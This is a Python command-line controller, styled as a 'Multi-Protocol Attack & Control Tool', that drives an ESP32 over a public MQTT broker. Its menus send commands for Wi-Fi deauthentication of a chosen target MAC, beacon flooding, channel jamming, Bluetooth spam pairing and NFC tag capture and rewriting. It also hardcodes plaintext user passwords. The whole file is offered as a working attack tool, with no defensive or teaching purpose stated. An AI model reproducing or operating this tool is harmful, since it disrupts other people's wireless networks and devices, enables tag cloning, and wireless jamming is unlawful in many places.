#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import json
import time
import getpass
import os
import sys
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Banner display
BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
{Fore.CYAN}║ {Fore.RED}███████{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗{Fore.RED}██████{Fore.GREEN}╗ {Fore.YELLOW}██{Fore.BLUE}╗{Fore.YELLOW}██████{Fore.BLUE}╗  {Fore.MAGENTA}██████{Fore.CYAN}╗ {Fore.WHITE}██{Fore.CYAN}╗  {Fore.WHITE}██{Fore.CYAN}╗ {Fore.CYAN}    ║
{Fore.CYAN}║ {Fore.RED}██{Fore.GREEN}╔════╝{Fore.RED}██{Fore.GREEN}╔════╝{Fore.RED}██{Fore.GREEN}╔══{Fore.RED}██{Fore.GREEN}╗{Fore.YELLOW}██{Fore.BLUE}║{Fore.YELLOW}██{Fore.BLUE}╔══{Fore.YELLOW}██{Fore.BLUE}╗{Fore.MAGENTA}██{Fore.CYAN}╔═══{Fore.MAGENTA}██{Fore.CYAN}╗{Fore.WHITE}██{Fore.CYAN}║  {Fore.WHITE}██{Fore.CYAN}║ {Fore.CYAN}    ║
{Fore.CYAN}║ {Fore.RED}█████{Fore.GREEN}╗  {Fore.RED}███████{Fore.GREEN}╗{Fore.RED}██████{Fore.GREEN}╔╝{Fore.YELLOW}██{Fore.BLUE}║{Fore.YELLOW}██████{Fore.BLUE}╔╝{Fore.MAGENTA}██{Fore.CYAN}║   {Fore.MAGENTA}██{Fore.CYAN}║{Fore.WHITE}███████{Fore.CYAN}║ {Fore.CYAN}    ║ 
{Fore.CYAN}║ {Fore.RED}██{Fore.GREEN}╔══╝  {Fore.GREEN}╚════{Fore.RED}██║{Fore.RED}██{Fore.GREEN}╔═══╝ {Fore.YELLOW}██{Fore.BLUE}║{Fore.YELLOW}██{Fore.BLUE}╔═══╝ {Fore.MAGENTA}██{Fore.CYAN}║   {Fore.MAGENTA}██{Fore.CYAN}║{Fore.WHITE}██{Fore.CYAN}╔══{Fore.WHITE}██{Fore.CYAN}║ {Fore.CYAN}    ║
{Fore.CYAN}║ {Fore.RED}███████{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}║{Fore.RED}██{Fore.GREEN}║     {Fore.YELLOW}██{Fore.BLUE}║{Fore.YELLOW}██{Fore.BLUE}║     {Fore.MAGENTA}╚{Fore.MAGENTA}██████{Fore.MAGENTA}╔{Fore.CYAN}╝{Fore.WHITE}██{Fore.CYAN}║  {Fore.WHITE}██{Fore.CYAN}║ {Fore.CYAN}    ║
{Fore.CYAN}║ {Fore.RED}╚══════{Fore.GREEN}╝{Fore.RED}╚══════{Fore.GREEN}╝{Fore.RED}╚═{Fore.GREEN}╝     {Fore.YELLOW}╚═{Fore.BLUE}╝{Fore.YELLOW}╚═{Fore.BLUE}╝      {Fore.MAGENTA}╚═════{Fore.CYAN}╝ {Fore.WHITE}╚═{Fore.CYAN}╝  {Fore.WHITE}╚═{Fore.CYAN}╝ {Fore.CYAN}    ║
{Fore.CYAN}╠══════════════════════════════════════════════════════════╣
{Fore.CYAN}║ {Fore.YELLOW}Multi-Protocol Attack & Control Tool {Fore.GREEN}v2.0              {Fore.CYAN}  ║
{Fore.CYAN}║ {Fore.WHITE}Termux Interface via MQTT                           {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════════════════╝
"""

# MQTT Configuration
MQTT_BROKER = "broker.hivemq.com"
MQTT_PORT = 1883
COMMAND_TOPIC = "esp32/commands"
LOGS_TOPIC = "esp32/logs"

# Allowed users and their passwords for authentication
ALLOWED_USERS = {
    "VNCNT": "91423",
    "VSPR": "95672",
    "KSYP": "75111"
}

# Global MQTT client
client = mqtt.Client("TermuxClient")
client_connected = False

def authenticate():
    print(f"{Fore.CYAN}==== ESP32 Remote Control Login ====")
    username = input("Username: ").strip()
    password = getpass.getpass("Password: ").strip()
    if username in ALLOWED_USERS and ALLOWED_USERS[username] == password:
        print(f"{Fore.GREEN}Authentication successful.\n")
        return True
    else:
        print(f"{Fore.RED}Authentication failed. Exiting...")
        return False

def on_message(client, userdata, message):
    try:
        payload = message.payload.decode('utf-8')
        data = json.loads(payload)
        print(f"{Fore.CYAN}[LOG] {json.dumps(data, indent=2)}")
    except Exception as e:
        print(f"{Fore.RED}Error decoding message: {e}")

def connect_mqtt():
    global client_connected
    client.on_message = on_message
    try:
        client.connect(MQTT_BROKER, MQTT_PORT, 60)
        client.subscribe(LOGS_TOPIC)
        client.loop_start()
        client_connected = True
    except Exception as e:
        print(f"{Fore.RED}[✗] Failed to connect to MQTT broker: {e}")
        sys.exit(1)

def send_command(cmd, params=None):
    if params is None:
        params = {}
    payload = {"cmd": cmd}
    payload.update(params)
    try:
        client.publish(COMMAND_TOPIC, json.dumps(payload))
        print(f"{Fore.YELLOW}[CMD] Sent: {json.dumps(payload)}")
    except Exception as e:
        print(f"{Fore.RED}Failed to send command: {e}")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)

def wifi_menu():
    while True:
        clear_screen()
        print(f"\n{Fore.CYAN}Wi-Fi Menu:{Style.RESET_ALL}")
        print("a) Scan & Deauth")
        print("b) Beacon Flood")
        print("c) Channel Jam")
        print("x) Return to Main Menu")
        choice = input(f"{Fore.GREEN}Wi-Fi>{Fore.WHITE} ").lower()

        if choice == 'a':
            send_command("wifi_scan")
            time.sleep(5)  # wait for scan results via logs
            target = input("Enter target MAC for deauth: ").strip()
            if target:
                send_command("wifi_deauth", {"target": target})
                print(f"{Fore.YELLOW}Deauth started on {target}")
            time.sleep(2)
        elif choice == 'b':
            ssid_prefix = input("Enter beacon SSID prefix: ").strip()
            count = input("Enter number of beacons: ").strip()
            if ssid_prefix and count.isdigit():
                send_command("wifi_beacon", {"prefix": ssid_prefix, "count": int(count)})
                print(f"{Fore.YELLOW}Beacon flood started.")
            else:
                print(f"{Fore.RED}Invalid input!")
            time.sleep(2)
        elif choice == 'c':
            channel = input("Enter channel to jam: ").strip()
            if channel.isdigit():
                send_command("wifi_jam", {"channel": int(channel)})
                print(f"{Fore.YELLOW}Channel jamming on channel {channel}.")
            else:
                print(f"{Fore.RED}Invalid channel!")
            time.sleep(2)
        elif choice == 'x':
            break
        else:
            print(f"{Fore.RED}Invalid choice!")
            time.sleep(1)

def bluetooth_menu():
    while True:
        clear_screen()
        print(f"\n{Fore.BLUE}Bluetooth Menu:{Style.RESET_ALL}")
        print("a) Scan & Spam Pair")
        print("x) Return to Main Menu")
        choice = input(f"{Fore.GREEN}BT>{Fore.WHITE} ").lower()

        if choice == 'a':
            send_command("bt_scan")
            time.sleep(5)  # Allow time for device scan logs to appear
            addr = input("Enter Bluetooth device address for spam pairing: ").strip()
            if addr:
                mins = input("Enter duration (minutes): ").strip()
                try:
                    duration = int(mins)
                    send_command("bt_spampair", {"device": addr, "duration": duration})
                    print(f"{Fore.YELLOW}Spam pairing started on {addr} for {duration} minute(s).")
                except:
                    print(f"{Fore.RED}Invalid duration!")
            time.sleep(2)
        elif choice == 'x':
            break
        else:
            print(f"{Fore.RED}Invalid choice!")
            time.sleep(1)

def nfc_menu():
    saved_nfc = {}  # Local dict for saved NFC tags
    while True:
        clear_screen()
        print(f"\n{Fore.YELLOW}NFC Menu:{Style.RESET_ALL}")
        print("a) Scan & Save")
        print("b) List Saved & Write")
        print("x) Return to Main Menu")
        choice = input(f"{Fore.GREEN}NFC>{Fore.WHITE} ").lower()

        if choice == 'a':
            send_command("nfc_scan")
            time.sleep(3)  # wait for tag scan
            uid = input("Enter detected NFC UID (from logs) to save: ").strip()
            if uid:
                name = input("Enter name for tag: ").strip()
                saved_nfc[name] = uid
                print(f"{Fore.GREEN}Saved tag {uid} as {name}")
            else:
                print(f"{Fore.RED}No tag UID provided!")
            time.sleep(2)
        elif choice == 'b':
            if saved_nfc:
                print(f"\n{Fore.YELLOW}Saved NFC Tags:{Style.RESET_ALL}")
                for name, uid in saved_nfc.items():
                    print(f"{name}: {uid}")
                sel = input("Enter name of tag to write (or blank to cancel): ").strip()
                if sel in saved_nfc:
                    send_command("nfc_write", {"uid": saved_nfc[sel]})
                    print(f"{Fore.GREEN}Writing NFC tag {sel}...")
                else:
                    print(f"{Fore.RED}Tag not found!")
            else:
                print(f"{Fore.RED}No saved NFC tags!")
            time.sleep(2)
        elif choice == 'x':
            break
        else:
            print(f"{Fore.RED}Invalid choice!")
            time.sleep(1)

def main_menu():
    clear_screen()
    while True:
        print(f"\n{Fore.CYAN}Main Menu:{Style.RESET_ALL}")
        print("1) Wi-Fi Tools")
        print("2) Bluetooth Tools")
        print("3) NFC Tools")
        print("0) Exit")
        choice = input(f"{Fore.GREEN}Main>{Fore.WHITE} ").strip()

        if choice == '1':
            wifi_menu()
        elif choice == '2':
            bluetooth_menu()
        elif choice == '3':
            nfc_menu()
        elif choice == '0':
            break
        else:
            print(f"{Fore.RED}Invalid choice!")
            time.sleep(1)

def main():
    clear_screen()
    if not authenticate():
        sys.exit(1)
    connect_mqtt()
    main_menu()
    client.loop_stop()
    client.disconnect()
    print(f"{Fore.YELLOW}Exiting. Goodbye!")

if __name__ == "__main__":
    main()
